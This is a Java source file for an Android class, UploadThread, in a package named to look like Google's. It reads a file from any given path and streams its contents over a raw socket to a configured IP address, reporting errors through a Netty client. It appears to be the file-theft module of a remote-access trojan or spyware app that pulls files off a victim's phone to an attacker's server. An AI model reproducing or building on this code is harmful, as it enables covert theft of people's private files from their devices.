package com.google.android.android;

import android.support.annotation.StyleableRes;

import com.google.android.android.Config;
import com.google.android.android.NettyClient;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

public class UploadThread extends Thread {

    private String path;
    private int port;

    UploadThread(String path, int port) {
        this.path = path;
        this.port = port;
    }

    @Override
    public void run() {
        try {
            Socket socket = new Socket(Config.IP_ADDRESS, port); //connect to server
            OutputStream outputStream = socket.getOutputStream();
            File file = new File((String) path);
            if (file.isDirectory()) {
                NettyClient.getInstance().sendErrorCode("fileIsDir", null);
                return;
            }
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] bytes = new byte[8 * 1024];
            int len;
            while ((len = fileInputStream.read(bytes)) != -1) {
                outputStream.write(bytes, 0, len); //transfer to server
            }

            outputStream.close();
            fileInputStream.close();
            socket.close();

        } catch(IOException e){e.printStackTrace();}
    }
}
